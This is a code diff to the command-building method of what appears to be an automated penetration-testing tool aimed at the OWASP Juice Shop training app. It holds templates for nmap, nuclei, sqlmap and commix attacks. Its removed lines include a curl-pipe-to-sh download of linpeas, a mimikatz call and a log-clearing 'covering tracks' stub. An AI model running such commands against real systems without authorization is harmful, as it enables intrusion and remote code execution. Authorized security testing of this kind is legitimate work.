@@ -390,61 +390,44 @@ class ToolManager:
     
     def build_command(self, tool_name: str, target: str,
                   parameters: Dict[str, Any]) -> str:
-        """
-        Build tool-specific commands with aggressive flags for vulnerability detection
+        """Build tool-specific commands - VERIFIED"""
         
-        Args:
-            tool_name: Name of the tool (e.g., 'nmap', 'sqlmap')
-            target: Target URL or IP address
-            parameters: Additional parameters (timeout, aggressive mode, etc.)
-        Returns:
-            Complete command string ready for execution
-        """
         # Normalize target URL
         if not target.startswith(('http://', 'https://')):
             target = f"http://{target}"
-
+        
         # Extract hostname/IP for tools that need it
         import re
         hostname_match = re.search(r'(?:https?://)?([^:/]+)', target)
         hostname = hostname_match.group(1) if hostname_match else target
-
-        # Tool command templates with AGGRESSIVE FLAGS
+        
+        # Tool command templates
         commands = {
             # RECONNAISSANCE
-            'sublist3r': f"sublist3r -d {hostname} -o /tmp/sublist3r_output.txt",
+            'sublist3r': f"sublist3r -d {hostname} -n",  # -n for no banner
             'theHarvester': f"theHarvester -d {hostname} -b all -f /tmp/harvester_{hostname}",
-            'dnsenum': f"dnsenum {hostname}",
+            'dnsenum': f"dnsenum --enum {hostname}",
             'fierce': f"fierce --domain {hostname}",
-            'whatweb': f"whatweb {target} -a 3 --color=never",
-
-            # SCANNING - AGGRESSIVE FLAGS FOR MAXIMUM COVERAGE
-            'nmap': f"nmap -sV -sC -p- -T4 --script=vuln,exploit {hostname} -oN /tmp/nmap_output.txt",
+            'whatweb': f"whatweb {target} -a 3 --color=never --log-brief=/tmp/whatweb_output.txt",
+            
+            # SCANNING
+            'nmap': f"nmap -sV -sC -p 1-1000 -T4 {hostname} -oN /tmp/nmap_output.txt",
             'masscan': f"masscan {hostname} -p1-65535 --rate=1000",
-            'nuclei': f"nuclei -u {target} -t ~/nuclei-templates/http/ -t ~/nuclei-templates/cves/ -severity critical,high,medium -json -o /tmp/nuclei_output.json",
+            'nuclei': f"nuclei -u {target} -severity critical,high,medium -silent",
             'nikto': f"nikto -h {target} -Tuning 123456789 -output /tmp/nikto_output.txt",
-            'enum4linux': f"enum4linux -a {hostname}",
-
-            # EXPLOITATION - TARGETED FOR JUICE SHOP
-            'sqlmap': self._build_sqlmap_for_juiceshop(target, parameters),
-            'dalfox': f"dalfox url {target}/#/search?q=test --skip-bav --skip-mining-dom --no-color",
-            'commix': f"commix --url='{target}' --batch --level=3 --risk=2",
-            'xsser': f"xsser --url '{target}' --auto",
-
-            # POST-EXPLOITATION
-            'linpeas': "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
-            'mimikatz': "python3 /usr/share/mimikatz/mimikatz.py",
-
-            # COVERING TRACKS
-            'clear_logs': "echo 'Log cleanup simulation' && echo '' > /tmp/dummy.log",
+            
+            # EXPLOITATION
+            'sqlmap': f"sqlmap -u '{target}' --batch --level=2 --risk=2 --threads=3 --random-agent",
+            'dalfox': f"dalfox url {target} --silence",
+            'commix': f"commix --url='{target}' --batch --level=2 --risk=2",
         }
-
+        
         base_command = commands.get(tool_name, f"echo 'Tool {tool_name} not configured'")
-
+        
         # Add timeout wrapper
-        timeout = parameters.get('timeout', 300)  # 5 minutes default
+        timeout = parameters.get('timeout', 300)
         command = f"timeout {timeout} {base_command}"
-
+        
         return command
 
     def _build_sqlmap_for_juiceshop(self, target: str, parameters: Dict[str, Any]) -> str:
